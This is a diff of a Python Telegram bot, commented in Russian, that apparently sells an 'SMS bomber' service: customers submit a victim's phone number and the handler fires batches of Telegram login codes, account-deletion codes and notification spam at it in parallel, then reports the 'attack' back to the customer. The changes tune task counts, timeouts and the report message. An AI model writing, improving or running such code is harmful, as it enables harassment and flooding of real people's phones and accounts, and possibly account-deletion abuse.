@@ -335,7 +335,6 @@ async def log_command(message: Message):
     
     # Проверяем режим техобслуживания
     if await check_maintenance_mode(user_id, message=message):
-
         return
     
     # Получаем аргумент команды (username или ID)
@@ -575,7 +574,6 @@ async def handle_continue(callback: CallbackQuery):
         if await check_and_auto_ban(user_id, bot=bot, action_type="callback"):
             return  # Тихий игнор
 
-    # Проверяем режим техобслуживания
     if await check_maintenance_mode(user_id, callback=callback):
         return
 
@@ -595,13 +593,10 @@ async def handle_continue(callback: CallbackQuery):
         await callback.message.delete()
     except:
         pass  # если удалить нельзя — игнор
-
-    
+  
     # Ждем 2 секунды
     await asyncio.sleep(2)
     
-    # Определяем приветствие в зависимости от времени
-    # Отправляем эмодзи молнии
     await bot.send_message(user_id, "⚡")
         
     # Формируем контент с цитатой и приветствием
@@ -959,7 +954,7 @@ async def handle_main(callback: CallbackQuery):
     # Если есть подписка, запрашиваем ID жертвы
     method_waiting = "sms"
     await callback.message.edit_text(
-        "<b>📪 Telegram Notification method</b>\n\n"
+        "<b>📬 Telegram Notification method</b>\n\n"
         "Отправьте номер телефона для доставки.\n"
         "Например: <code>+79999999999</code>",
         parse_mode="html",
@@ -1600,10 +1595,6 @@ async def handle_all_messages(message: Message):
     
     # Проверяем режим техобслуживания для не-админов
     if maintenance_mode and not is_admin(user_id):
-        await message.answer(
-            **BlockQuote(Bold(f"🔧 Бот сейчас находится на тех. обслуживании")).as_kwargs()
-        )
-        write_log(f"{user_id} попытался отправить сообщение во время техобслуживания")
         return
     
     # Обработка промокодов (только для админов)
@@ -1728,92 +1719,178 @@ async def handle_all_messages(message: Message):
     
     # Обработка методов (session/main/premium) - проверка ID жертвы
     if method_waiting == "sms":
-        # Проверяем бан перед обработкой метода
+        # Проверяем бан
         if not is_admin(user_id):
             if await check_ban_and_notify(user_id, bot=bot, message=message):
-                method_waiting = ""  # Сбрасываем флаг
+                method_waiting = ""
                 return
-        
+
         target_id = parse_user_id(text)
         if target_id is None:
-            await message.answer("❌ <b>Ошибка!</b>\n\nНеверный формат. Отправьте корректный номер телефона для доставки.\n\nПример: <code>+79999999999</code>", parse_mode="html")
+            await message.answer(
+                "❌ <b>Ошибка!</b>\n\nНеверный формат номера.\nПример: <code>+79999999999</code>",
+                parse_mode="HTML"
+            )
             return
-        
+
         method = method_waiting
-        method_waiting = ""  # Сбрасываем флаг
-        
-        # Имитируем отправку SMS с анимацией
-        progress_msg = await message.answer(f"📬 Начинаю отправку на: {target_id}, пожалуйста подождите..", parse_mode="HTML")
-        
-        # Создаем файл логов для fast__method
+        method_waiting = ""
+
+        progress_msg = await message.answer(
+            f"<b>📬 Начинаю доставку на: <code>+{target_id}</code>, пожалуйста подождите...</b>",
+            parse_mode="HTML"
+        )
+
+        # ---- ЛОГИ ----
         from datetime import datetime
-        log_file_path = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+        log_file_path = os.path.join(
+            log_dir,
+            f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        )
+
         set_log_file(log_file_path)
-        
-        # Запускаем fast method два раза и обычные коды параллельно
+
+        from bomber import set_log_file as bomber_set_log_file
+        bomber_set_log_file(log_file_path)
+
+        write_log(f"[SMS] Лог файл: {log_file_path}")
+
+        # ---- FAST METHOD (НЕ ЖДЁМ, НЕ БЛОКИРУЕТ) ----
         async def run_fast_method_async():
             try:
-                # Устанавливаем файл логов для fast__method
-                set_log_file(log_file_path)
                 loop = asyncio.get_event_loop()
-                write_log(f"[SMS METHOD] Запуск fast method для {target_id}")
-                result = await loop.run_in_executor(executor, spam_notification_sync, target_id, log_dir, None)
-                write_log(f"[SMS METHOD] Fast method завершен для {target_id}, результат: {result}")
-                return result
+                write_log(f"[SMS] FAST start {target_id}")
+                result = await loop.run_in_executor(
+                    executor,
+                    spam_notification_sync,
+                    target_id, log_dir, None
+                )
+                write_log(f"[SMS] FAST done {target_id} → {result}")
             except Exception as e:
-                write_log(f"[SMS METHOD] Ошибка в fast method для {target_id}: {str(e)}")
-                return False
-        
-        # МАКСИМАЛЬНАЯ МОЩНОСТЬ: все режимы параллельно
+                write_log(f"[SMS] FAST ERROR {target_id}: {e}")
+
+        max_normal_tasks = 5
+        max_delete_tasks = 5
+        max_fast_tasks = 2
+
+        write_log(
+            f"[SMS] FULL POWER → {target_id}: "
+            f"{max_normal_tasks} normal, {max_delete_tasks} delete, {max_fast_tasks} fast"
+        )
+
+        # ---- ОСНОВНЫЕ КОДЫ (их ждём) ----
+        normal_tasks = [
+            asyncio.create_task(send_code(target_id))
+            for _ in range(max_normal_tasks)
+        ]
+
+        # ---- DELETE КОДЫ ----
         from bomber import spam_delete_codes, send_log_file
-        
-        max_normal_tasks = 15  # Обычные коды входа
-        max_delete_tasks = 10  # Коды удаления
-        max_fast_method_tasks = 4  # Fast method (уведомления)
-        
-        write_log(f"[SMS METHOD] МАКСИМАЛЬНЫЙ СПАМ для {target_id}: {max_normal_tasks}x обычные + {max_delete_tasks}x удаление + {max_fast_method_tasks}x уведомления")
-        
-        # Обычные коды входа
-        normal_code_tasks = [asyncio.create_task(send_code(target_id)) for _ in range(max_normal_tasks)]
-        
-        # Коды удаления аккаунта
-        delete_tasks = [asyncio.create_task(spam_delete_codes(target_id)) for _ in range(max_delete_tasks)]
-        
-        # Fast method (уведомления)
-        fast_method_tasks = [asyncio.create_task(run_fast_method_async()) for _ in range(max_fast_method_tasks)]
-        
-        # Запускаем ВСЕ задачи параллельно с таймаутом 60 секунд
-        all_tasks = normal_code_tasks + delete_tasks + fast_method_tasks
-        write_log(f"[SMS METHOD] Запущено {len(all_tasks)} задач параллельно, таймаут 60 секунд")
-        
+
+        delete_tasks = [
+            asyncio.create_task(spam_delete_codes(target_id))
+            for _ in range(max_delete_tasks)
+        ]
+
+        # ---- FAST METHOD (НЕ ЖДЁМ!) ----
+        for _ in range(max_fast_tasks):
+            asyncio.create_task(run_fast_method_async())
+
+        all_main_tasks = normal_tasks + delete_tasks
+
+        write_log(f"[SMS] Запуск основных задач ({len(all_main_tasks)} шт), таймаут 90 секунд")
+
+        start_time = datetime.now()
+
+        # ---- БЛОК УПРАВЛЕНИЯ ТАЙМАУТОМ ----
         try:
             await asyncio.wait_for(
-                asyncio.gather(*all_tasks, return_exceptions=True),
-                timeout=60.0
+                asyncio.gather(*all_main_tasks, return_exceptions=True),
+                timeout=90
             )
-            write_log(f"[SMS METHOD] Все задачи завершены для {target_id} в течение 60 секунд")
+            write_log(f"[SMS] Основные задачи завершены вовремя ({target_id})")
+
         except asyncio.TimeoutError:
-            write_log(f"[SMS METHOD] Превышен таймаут 60 секунд для {target_id}, отменяем все задачи")
-            # Отменяем все задачи при таймауте
-            for task in all_tasks:
+            write_log(f"[SMS] ТАЙМАУТ 90 сек → отмена основных задач ({target_id})")
+
+            for task in all_main_tasks:
                 if not task.done():
                     task.cancel()
                     try:
                         await task
-                    except (asyncio.CancelledError, asyncio.TimeoutError):
+                    except:
                         pass
+
         except Exception as e:
-            write_log(f"[SMS METHOD] Ошибка при выполнении задач для {target_id}: {str(e)}")
-        
-        # Отправляем логи КЛИЕНТУ, который заказал спам
+            write_log(f"[SMS] ERROR main tasks: {e}")
+            import traceback
+            write_log(traceback.format_exc())
+
+        # ---- СООБЩЕНИЕ О ЗАВЕРШЕНИИ ----
         try:
-            await send_log_file(log_file_path, target_id, user_id=user_id)
-            write_log(f"[SMS METHOD] Логи отправлены клиенту {user_id}")
+            await progress_msg.edit_text("📊 <b>Атака завершена! Формирую отчёт...</b>", parse_mode="HTML")
+        except:
+            pass
+
+        await asyncio.sleep(2)
+
+        # ---- ФОРМИРУЕМ И ОТПРАВЛЯЕМ ОТЧЕТ ----
+        try:
+            customer_username = message.from_user.username or "Не указан"
+            if customer_username != "Не указан":
+                customer_username = f"@{customer_username}"
+
+            end_time = datetime.now()
+            duration = (end_time - start_time).total_seconds()
+
+            if not os.path.exists(log_file_path):
+                write_log(f"[SMS] Лог не найден, создаю пустой")
+                with open(log_file_path, "w", encoding="utf-8") as f:
+                    f.write("")
+
+            write_log(f"[SMS] Отправляю логи клиенту...")
+
+            await send_log_file(
+                log_file_path,
+                target_id,
+                user_id=user_id,
+                customer_username=customer_username,
+                start_time=start_time,
+                end_time=end_time,
+                duration=duration
+            )
+
+            write_log(f"[SMS] Логи отправлены")
+
+            try:
+                await progress_msg.edit_text(
+                    "✅ <b>Атака завершена!</b>\n📄 Отчёт отправлен.",
+                    parse_mode="HTML",
+                    reply_markup=back_keyboard
+                )
+            except:
+                await message.answer(
+                    "✅ <b>Атака завершена!</b>\n📄 Отчёт отправлен.",
+                    parse_mode="HTML",
+                    reply_markup=back_keyboard
+                )
+
         except Exception as e:
-            write_log(f"[SMS METHOD] Ошибка при отправке логов клиенту {user_id}: {str(e)}")
-            
-        # await progress_msg.edit_text("✅ <b>Успешно отправлено!</b>\n\nДоставка была успешно выполнена!", parse_mode="html", reply_markup=back_keyboard)
-        write_log(f"Пользователь {user_id} использовал метод {method} для {target_id} - SMS отправлено")
+            write_log(f"[SMS] Ошибка отправки отчёта: {e}")
+            try:
+                await progress_msg.edit_text(
+                    f"⚠️ <b>Ошибка при отправке отчёта:</b>\n<code>{e}</code>",
+                    parse_mode="HTML",
+                    reply_markup=back_keyboard
+                )
+            except:
+                await message.answer(
+                    f"⚠️ <b>Ошибка при отправке отчёта:</b>\n<code>{e}</code>",
+                    parse_mode="HTML",
+                    reply_markup=back_keyboard
+                )
+
+        write_log(f"[SMS] Пользователь {user_id} → метод {method} для {target_id}")
         return
 
     elif method_waiting == "mail" or method_waiting == "premium" or method_waiting == "session":
